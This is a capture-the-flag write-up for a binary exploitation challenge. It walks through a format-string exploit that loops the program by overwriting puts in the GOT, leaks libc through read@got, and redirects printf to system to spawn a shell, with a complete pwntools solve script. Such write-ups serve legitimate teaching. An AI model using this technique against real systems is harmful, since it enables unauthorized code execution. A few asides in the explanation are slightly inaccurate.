Speedrun 5 writeup

First I started by checksecing the binary

(pwn) eric@Eric:~/OOO/speedrun5$ checksec speedrun5
[*] '/home/eric/OOO/speedrun5/speedrun5'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)

So the mitigations we have to deal with are NX and a canary on the stack. We notice that there is no PIE so we can overwrite a GOT address. I assume this will be either a ROP problem (because of NX) or a GOT overwrite (no PIE to complicate this)

Running the binary, we see a greeting

(pwn) eric@Eric:~/OOO/speedrun5$ ./speedrun5
Fifth time's the charm?
What do you mean this time? AAA
Interesting AAA
<{ food for thought
Safe, yet again.

So it prints out our buffer right back to us. Let’s see if there is a format string vulnerability

(pwn) eric@Eric:~/OOO/speedrun5$ ./speedrun5
Fifth time's the charm?
What do you mean this time? %p %p %p
Interesting 0x7ffcaf398cc0 (nil) (nil)
{H\~~ food for thought
Safe, yet again.

Nice. So this leads me to 2 exploit paths. - Bypassing the canary by overwriting the return address with a win function (if it exists) using %n - Overwrite a GOT address with %n (unsure with what yet though)

After scrolling through the decompiled input, we don’t find a win function. This function is what makes up pretty much the entire binary besides the greeting and farewell messages:

void FUN_0040072d(void)

{
  long in_FS_OFFSET;
  char local_418 [1032];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("What do you mean this time? ");
  read(0,local_418,0x400);
  printf("Interesting ");
  printf(local_418);
  puts(" food for thought");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}

So there is no buffer overflow, but that’s okay since we don’t need it. After our format string is called, there is a call to puts. We can overwrite this puts got address with the address of this function so it can loop the program for us. (if we chose to do main, we would infinitely loop because of the initial puts call in the greeting message)

In order to do that, we must find out where our input lives on the stack. After trial and error, 6 is the offset I started seeing my input at.

After that, we can find out what the address of libc is by calling printf on the read GOT address. To get it to line up cleanly as our 7th argument, we need to consider how our input looks on the stack.

Our input starts at the 6th offset. Since 64 bit has addresses in 8 bytes, and we are going to be sending %?$s, that’s 4 bytes. In order to fill up the entire 6th argument, we need 4 more bytes of padding. So to cleanly read the got address, we need to send %7$sAAAA, which fills up the 8 bytes and then right after we will see where the resolved libc address of read is. Then, we can find out the libc base by subtracting the leaked libc base - libc.sym['read'].

(pwn) eric@Eric:~/OOO/speedrun5$ python3 solve.py
[+] Starting local process './speedrun5': pid 21406
[*] --- STAGE 1 ---
[+] Loop established
[*] --- STAGE 2 ---
[+] Leaked read@got: 0x71155cf1ba80
[+] Libc Base: 0x71155ce00000

After we find out the libc base, we can find the address of system, which would be Libc.sym['system']

Now, to get into stage 3 of the exploit, we need to overwrite the printf call with the address of system. That way, when we get into the loop again, it will prompt us for input with the read call, we can send ‘bin/sh’ and printf will call that, meaning it will call system(/bin/sh) which pops a shell for us.

Putting that altogether, we have our exploit:

from pwn import *

exe = './speedrun5'
elf = context.binary = ELF(exe, checksec=False)
p = process(exe)
libc = elf.libc

OFFSET = 6

def send_payload(payload):
    p.sendline(payload)
    try: 
        p.recvuntil(b"Interesting ") 
    except: 
        pass

writes = {elf.got['puts']: 0x40072d}
payload = fmtstr_payload(OFFSET, writes)
send_payload(payload)
log.success("Loop established")

leak_payload = b"%7$sAAAA" + p64(elf.got['read'])
send_payload(leak_payload)

raw_leak = p.recvuntil(b"AAAA")[:-4] 
leaked_addr = u64(raw_leak.ljust(8, b"\x00"))
log.success(f"Leaked read@got: {hex(leaked_addr)}")

libc.address = leaked_addr - libc.symbols['read']
log.success(f"Libc Base: {hex(libc.address)}")

writes = {elf.got['printf']: libc.symbols['system']}
payload = fmtstr_payload(OFFSET, writes)
send_payload(payload)
log.success("Overwrite complete")

p.sendline(b"/bin/sh")
p.interactive()

And we popped a shell!

Important note to remember

When we overwrite the call to printf with the address of system, you might be wondering why we don’t crash when we call system(‘What do you mean this time?’) or system(‘Interesting’)

Because system spawns a child process to run the system command, if it fails, it prints to stdin that it failed but then execution returns to the parent, essentially allowing us to keep executing until we hit system(/bin/sh) which pops the shell for us.
